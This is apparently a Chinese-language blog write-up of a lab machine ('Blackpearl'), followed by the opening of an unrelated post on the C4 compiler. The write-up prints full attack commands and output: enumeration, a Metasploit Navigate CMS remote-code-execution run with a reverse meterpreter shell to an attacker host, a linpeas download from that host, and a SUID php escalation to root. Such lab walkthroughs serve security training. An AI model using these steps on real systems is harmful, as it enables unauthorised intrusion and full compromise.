<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -s --json</code></p>
<ul>
<li>Scan a domain, performing a Google enumeration and saving the results to a CSV file:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -g --csv</code></p>
<ul>
<li>Scan a domain, performing DNS cache snooping:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type snoop --name_server &#123;&#123;nameserver.example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125;</code></p>
<ul>
<li>Scan a domain, performing zone walking:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type zonewalk</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# **dnsrecon -r 127.0.0.0/24 -n 192.168.19.144**       </span><br><span class="line">[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255</span><br><span class="line">[+]      **PTR blackpearl.tcm 127.0.0.1**</span><br><span class="line">[+] 1 Records Found</span><br></pre></td></tr></table></figure>

<p>把這網域新增到&#x2F;etc&#x2F;hosts，這樣才能訪問到那網頁位置，並開啟那網頁嘗試訪問</p>
<p><img src="/img/privilege_Untitled_43.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_44.png" alt="Untitled"></p>
<p>接下來看看網頁下是否有潛藏的目錄內容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://blackpearl.tcm/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 9ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 11ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 14ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 19ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 21ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 25ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 28ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 31ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 34ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 37ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 41ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 45ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 47ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 68ms]</span></span><br><span class="line"><span class="string">**navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 10ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 7407 req/sec :: Duration: [0:00:29] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>查看到navigate目錄下是登入頁面</p>
<ul>
<li>Navigate CMS v2.8, © 2024</li>
</ul>
<p><img src="/img/privilege_Untitled_45.png" alt="Untitled"></p>
<ul>
<li>查看該版本可能的利用點</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA0QAQ&url=https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/&usg=AOvVaw0YC3U48-x5GBaLUam_sYrP&opi=89978449">Navigate CMS Unauthenticated Remote Code Execution</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECBEQAQ&url=https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-&usg=AOvVaw2kvp91G1FyoMXbtaidHmEF&opi=89978449">GitHub - 0x4r2&#x2F;Navigate-CMS-RCE-Unauthenticated-: This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA8QAQ&url=https://www.exploit-db.com/exploits/45561&usg=AOvVaw0ZgfU3dceG_UvE4GwEcOXX&opi=89978449">Navigate CMS - (Unauthenticated) Remote Code Execution (Metasploit)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt;  **use exploit/multi/http/navigate_cms_rce**</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   **RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas**</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   **LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)**</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   **0   Automatic**</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> target 0**</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> rhost 192.168.19.144**</span><br><span class="line">rhost =&gt; 192.168.19.144</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> vhost blackpearl.tcm**</span><br><span class="line">vhost =&gt; blackpearl.tcm</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     192.168.19.144   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST      blackpearl.tcm   no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[+] Login bypass successful</span><br><span class="line">[+] Upload successful</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Sending stage (39927 bytes) to 192.168.19.144</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.144:45840) at 2024-02-17 09:46:30 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **shell**</span><br><span class="line">Process 1843 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/blackpearl.tcm/navigate</span><br></pre></td></tr></table></figure>

<p>想要讓shell介面更好看</p>
<p><a target="_blank" rel="noopener" href="https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell">https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell</a></p>
<ul>
<li><p>TTY Shell</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">/bin/sh -i</span><br><span class="line"></span><br><span class="line">perl —e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line">ruby: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">lua: os.execute(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(From within IRB)</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:!bash</span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash:shell</span><br><span class="line"></span><br><span class="line">(From within nmap)</span><br><span class="line">!sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line">**python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>**  </span><br><span class="line">www-data@blackpearl:~/blackpearl.tcm/navigate$</span><br></pre></td></tr></table></figure>

<p>利用<a target="_blank" rel="noopener" href="http://linpeas.sh/">linpeas.sh</a>獲取伺服器有用資訊，進行linux提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$  **wget http://192.168.19.130/linpeas.sh linpeas.sh**</span><br><span class="line"> wget http://192.168.19.130/linpeas.sh linpeas.sh</span><br><span class="line">--2024-02-17 10:36:38--  http://192.168.19.130/linpeas.sh</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 853290 (833K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">linpeas.sh          100%[===================&gt;] 833.29K  --.-KB/s    <span class="keyword">in</span> 0.05s   </span><br><span class="line"></span><br><span class="line">2024-02-17 10:36:38 (16.2 MB/s) - <span class="string">&#x27;linpeas.sh&#x27;</span> saved [853290/853290]</span><br><span class="line"></span><br><span class="line">--2024-02-17 10:36:38--  http://linpeas.sh/</span><br><span class="line">Resolving linpeas.sh (linpeas.sh)... failed: Temporary failure <span class="keyword">in</span> name resolution.</span><br><span class="line">wget: unable to resolve host address <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line">FINISHED --2024-02-17 10:37:03--</span><br><span class="line">Total wall clock <span class="keyword">time</span>: 25s</span><br><span class="line">Downloaded: 1 files, 833K <span class="keyword">in</span> 0.05s (16.2 MB/s)</span><br><span class="line">www-data@blackpearl:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 868</span><br><span class="line">drwxrwxrwt  8 root     root       4096 Feb 17 10:39 .</span><br><span class="line">drwxr-xr-x 18 root     root       4096 May 30  2021 ..</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .XIM-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .font-unix</span><br><span class="line">**-rw-r--r--  1 www-data www-data 853290 Feb 15 14:03 linpeas.sh**</span><br><span class="line">drwx------  3 root     root       4096 Feb 17  2024 systemd-private-377639e5743d4205b9d4759ec2aad65c-systemd-timesyncd.service-q855cz</span><br><span class="line">www-data@blackpearl:/tmp$ **<span class="built_in">chmod</span> +x linpeas.sh**</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">www-data@blackpearl:/tmp$ **./linpeas.sh**</span><br><span class="line">./linpeas.sh</span><br><span class="line">....</span><br><span class="line">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">strings Not Found                                                                                              </span><br><span class="line">strace Not Found                                                                                               </span><br><span class="line">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br><span class="line">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   </span><br><span class="line">-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                        </span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span><br><span class="line"></span><br><span class="line">╔══════════╣ SGID</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 35K Jan 10  2019 /usr/bin/wall</span><br><span class="line">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 15K May  4  2018 /usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span><br><span class="line">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span><br><span class="line">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Backup files (limited 100)</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 1421 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/external/tracy/src/Tracy/assets/Debugger/error.500.phtml.bak</span><br><span class="line">**-rwxr-xr-x 1 www-data www-data 12282 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backups.php**</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 12546 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backup.class.php</span><br><span class="line">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span><br><span class="line">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>控制文件訪問權限、分別允許用戶以可執行文件的 owner 或 owner group 的權限運行可執行文件</p>
<p>SUID &gt;</p>
<ul>
<li>普通用戶想運行只有權限高用戶才能執行的文件，就要通過SUID的功能</li>
<li>owner的訊息為rws而不是rwx，當s出現在文件擁有者的權限上時，就稱為SETUID BITS或SETUID<ul>
<li>SUID權限僅對二進制可執行文件有效</li>
<li>執行者對二進制可執行文件具有x的權限，執行者將具有該文件的所有者權限</li>
<li>權限僅在<strong>執行二進制可執行文件的過程</strong>中有效</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">**-rws**r-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_46.png" alt="Untitled"></p>
<p>SGID &gt; </p>
<ul>
<li><p>當一般使用者 tester 執行 mlocate 指令時，tester 就會取得使用者群組 mlocate 的執行權限，又因為使用者群組 mlocate 對 mlocate.db 有讀取權限，所以 tester 就可以讀取 mlocate.db 了。</p>
<p>  <img src="/img/privilege_Untitled_47.png" alt="Untitled"></p>
</li>
<li><p>SGID 也可以用在目錄上</p>
<ul>
<li>使用者若對此目錄具有 r 和 x 權限，則該使用者能夠進入該目錄</li>
<li>使用者在此目錄下的有效使用者群組將變成該目錄的使用者群組</li>
<li>若使用者在此目錄下擁有 w 權限，則使用者建立的新檔案的使用者群組與該目錄的使用者群組相同</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwx**r-s**r-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>當 SGID 作用於普通檔案時，和 SUID 類似，在執行該檔案時，<strong>使用者將獲得該檔案所屬群組的權限</strong>。</p>
<p>當 SGID 作用於目錄時，意義就非常重大了。當使用者對<strong>某一目錄有寫入和執行權限</strong>時，該使用者就可以在該<strong>目錄下建立文件</strong>，如果該目錄以 SGID 修飾，則該使用者在這個目錄下建立的文件都是屬於這個目錄所屬的群組。</p>
<p>以數字的方式設定權限:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SUID-&gt;4</span><br><span class="line">SGID-&gt;2</span><br></pre></td></tr></table></figure>

<p>找出所有SUID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment">#在系統中尋找擁有SUID權限設置的文件。具有SUID權限的文件在執行時將以其擁有者的身份而不是執行者的身份運行</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">**/usr/bin/php7.3**</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">www-data@blackpearl:/tmp$</span><br></pre></td></tr></table></figure>

<p>Google搜尋GTFOBins &gt; SUID&gt;</p>
<p>查找列出的指令跟上面列出的擁有SUID權限設置的文件只有php剛好匹配，利用它做權限提升</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/php/">https://gtfobins.github.io/gtfobins/php/</a></p>
<p><img src="/img/privilege_Untitled_48.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ **/usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span>**</span><br><span class="line">&lt;usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) **euid=0(root)** <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">Good job on this one.</span><br><span class="line">Finding the domain name may have been a little guessy,</span><br><span class="line">but the goal of this box is mainly to teach about Virtual Host Routing <span class="built_in">which</span> is used <span class="keyword">in</span> a lot of CTF.</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-c4" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/c4/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/c4/">
        C4 - C In Four Functions
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="4個函數，528行代碼實現可自舉的C語言編譯器"><a href="#4個函數，528行代碼實現可自舉的C語言編譯器" class="headerlink" title="4個函數，528行代碼實現可自舉的C語言編譯器"></a><strong>4個函數，528行代碼實現可自舉的C語言編譯器</strong></h1><p>C4怎麼工作？</p>
<p>模擬程式運作機制定義了簡單的vm（虛擬機器）的暫存器，程式運行的資料和程式碼段等<br>透過解析輸入檔的字元流，生產資料段和程式碼段的內容<br>透過讀取程式碼段的內容，模擬執行，輸出結果。<br>特別說明</p>
<p>這裡的模擬執行其實就是特定的符號映射成一般的c語言的程式設計過程：</p>
<p>如模擬執行的程式碼ADD，就是程式設計時的+</p>
<p>如模擬執行的PRTF，就是呼叫一般的printf</p>
<p>一句話說就是解析原始碼檔案字元流為內部的特定標識符，然後讀取標識符，執行對應的操作，完成原始程式碼的功能。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/tree/master">https://github.com/rswier/c4/tree/master</a></p>
<p><img src="/img/c4.png" alt="Untitled"></p>
